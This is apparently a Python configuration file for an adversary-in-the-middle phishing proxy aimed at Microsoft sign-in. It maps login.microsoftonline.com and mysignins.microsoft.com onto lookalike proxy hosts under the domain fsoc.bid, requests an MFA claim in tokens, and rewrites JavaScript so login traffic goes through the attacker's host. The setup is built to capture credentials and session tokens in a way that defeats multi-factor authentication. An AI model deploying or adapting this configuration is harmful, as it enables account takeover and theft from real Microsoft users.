"""
AiTM Config
"""

from aitm.helpers.config import Config

config = Config(
    mfa_claim='{"id_token":{"amr":{"essential":true,"values":["mfa"]}},"access_token":{"amr":{"essential":true,"values":["mfa"]}}}',
    auth_url=["/kmsi"],
    local_upstream_hostname="local.upstream.host",
)

config.targets = [
    {"origin": "mysignins.microsoft.com", "proxy": "mysignins.fsoc.bid", "port": 6000},
    {"origin": "login.microsoftonline.com", "proxy": "login.fsoc.bid", "port": 6001}
]
config.content_types = [
    "text/html",
    "application/json",
    "application/javascript",
    "application/x-javascript",
]

config.custom_modifications = [
    {
        "mimes": ["application/javascript", "application/x-javascript"],
        "sites": ["mysignins.microsoft.com"],
        "search": "login.windows-ppe.net",
        "replace": "login.fsoc.bid",
    }
]
